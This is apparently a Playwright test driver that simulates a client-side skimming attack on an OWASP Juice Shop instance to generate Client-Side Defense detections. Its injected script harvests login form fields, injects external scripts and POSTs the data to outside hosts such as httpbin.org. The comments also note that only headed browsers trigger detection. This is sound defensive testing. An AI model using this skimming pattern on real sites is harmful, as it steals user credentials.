#!/usr/bin/env node
// CSD Detection driver — runs the documented Combined Detection Script against the CSD-instrumented
// OWASP Juice Shop app to generate F5 XC Client-Side Defense detections.
//
// IMPORTANT target correction: CSD is injected by the LB only on the Juice Shop SPA at
// `/juice-shop/` — that is the app the CSD docs (csd/docs/en) are written for and the only path
// where access logs show `csd_js_injection=true`. Earlier iterations of this suite targeted a
// custom `/csd-demo/` page, which the LB does NOT CSD-inject, so it produced no detections.
//
// IMPORTANT browser requirement: Shape's *event-driven* telemetry beacon (the one that reports the
// injected scripts + field reads, i.e. the detection signal) only fires from a REAL, HEADED browser.
// Verified empirically: headed real Chrome → 2 `__imp_apg__/api/dip` beacons (load + event); any
// headless browser (bundled chromium OR real Chrome `headless`) → 1 beacon (load only) → no
// detection. Shape is anti-automation by design, so headless/datacenter traffic is filtered.
//   - For real detections: run this from a HEADED real browser on a real-client IP
//     (e.g. Playwright `channel:'chrome', headless:false` on an operator workstation over the VPN),
//     which is how the documented demo is driven.
//   - Run headless (the default when launched by runner.sh on the generator VM) exercises the
//     sensor-load + injection path and is a useful liveness check, but will not populate detections.
//
// The script follows the docs' Phase-2 initScript pattern: run at document-start, poll for the
// Juice Shop login fields (Angular/zone.js SPA), fill credentials via the native value setter, then
// execute the Combined Detection Script inline (harvest fields → inject 4 CDN scripts → exfil to
// external endpoints). Verification of the resulting detections is done by webapp-api-protection
// scripts/csd-verify.sh.
//
// Usage (via runner.sh): runner.sh csd-detection   (runner passes $TARGET_FQDN as argv[2])
//   HEADFUL=1 forces a headed real Chrome (channel:chrome) — required for actual detections.

const TARGET_FQDN = process.argv[2];
if (!TARGET_FQDN) {
  console.error('Usage: 01-combined-detection.js <TARGET_FQDN>');
  process.exit(1);
}
const BASE_URL = `${process.env.TARGET_PROTOCOL || 'http'}://${TARGET_FQDN}`;
const PAGE_URL = `${BASE_URL}/juice-shop/#/login`;
const HEADFUL = process.env.HEADFUL === '1';

// Prefer the full playwright package (bundled chromium); fall back to playwright-core + system Chrome.
let chromium;
try {
  ({ chromium } = require('playwright'));
} catch {
  ({ chromium } = require('playwright-core'));
}

const isBeacon = (u) => /__imp_apg__\/api\/dip/.test(u);
const isSensor = (u) => /__imp_apg__\/js\//.test(u);

(async () => {
  let browser;
  try {
    const launchOpts = { headless: !HEADFUL, args: ['--no-sandbox', '--disable-dev-shm-usage'] };
    if (HEADFUL) launchOpts.channel = 'chrome'; // real Chrome for the event-driven beacon
    browser = await chromium.launch(launchOpts);
    const context = await browser.newContext({ ignoreHTTPSErrors: true });

    // Document-start attack: fill Juice Shop login + run the Combined Detection Script inline.
    await context.addInitScript(() => {
      const _si = window.setInterval.bind(window);
      const _ci = window.clearInterval.bind(window);
      const _fetch = window.fetch.bind(window);
      const _log = window.console.log.bind(window.console);
      const poll = _si(() => {
        const emailEl = document.querySelector('#email') || document.querySelector('input[type="email"]');
        const passEl = document.querySelector('#password') || document.querySelector('input[type="password"]');
        if (!emailEl || !passEl) return;
        _ci(poll);
        const nset = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nset.call(emailEl, 'test@example.com');
        emailEl.dispatchEvent(new Event('input', { bubbles: true }));
        nset.call(passEl, 'P@ssword123');
        passEl.dispatchEvent(new Event('input', { bubbles: true }));
        const fields = {};
        document.querySelectorAll('input').forEach((i) => {
          fields[i.name || i.id || i.type] = i.value || '(empty)';
        });
        _log(`[CSD Demo] Harvested ${Object.keys(fields).length} fields`);
        [
          'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
          'https://esm.sh/moment@2.30.1',
          'https://unpkg.com/underscore@1.13.7/underscore-min.js',
          'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js',
        ].forEach((src) => {
          const s = document.createElement('script');
          s.src = src;
          document.head.appendChild(s);
        });
        const payload = JSON.stringify({
          type: 'combined_demo',
          credentials: fields,
          page: location.href,
          timestamp: Date.now(),
        });
        _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload });
        _fetch('https://jsonplaceholder.typicode.com/posts', {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
        });
        _log('[CSD Demo] Simulation complete');
      }, 300);
    });

    const page = await context.newPage();
    const beacons = [];
    let sensor = false;
    let done = false;
    page.on('response', (r) => {
      const u = r.url();
      if (isSensor(u)) sensor = true;
      if (isBeacon(u)) beacons.push(r.status());
    });
    page.on('console', (m) => {
      if (/Simulation complete/.test(m.text())) done = true;
    });

    await page.goto('about:blank');
    await page.goto(PAGE_URL, { waitUntil: 'load', timeout: 40000 });
    await page.keyboard.press('Escape').catch(() => {}); // dismiss welcome banner
    await page.waitForTimeout(22000); // Angular render + attack + beacon window

    console.log(
      `[CSD Detection] mode=${HEADFUL ? 'headed(real-chrome)' : 'headless'} attack_executed=${done} sensor=${sensor} dip_beacons=${beacons.length}`,
    );
    if (!sensor) {
      console.error('FAIL: CSD sensor not injected on /juice-shop/ (CSD not enabled/propagated on the LB).');
      process.exit(1);
    }
    if (!done) {
      console.error('FAIL: Combined Detection Script did not complete (login form not found in time?).');
      process.exit(1);
    }
    if (beacons.length < 2) {
      console.log(
        'NOTE: only the load beacon fired (headless). Detections require a HEADED real browser (HEADFUL=1) — Shape filters headless. Sensor+injection path OK.',
      );
    } else {
      console.log(
        'PASS: attack executed with the event-driven beacon (2+ dip) — detection signal sent; verify via csd-verify.sh.',
      );
    }
    process.exit(0);
  } catch (err) {
    console.error(`ERROR: ${err.message}`);
    process.exit(1);
  } finally {
    if (browser) await browser.close();
  }
})();
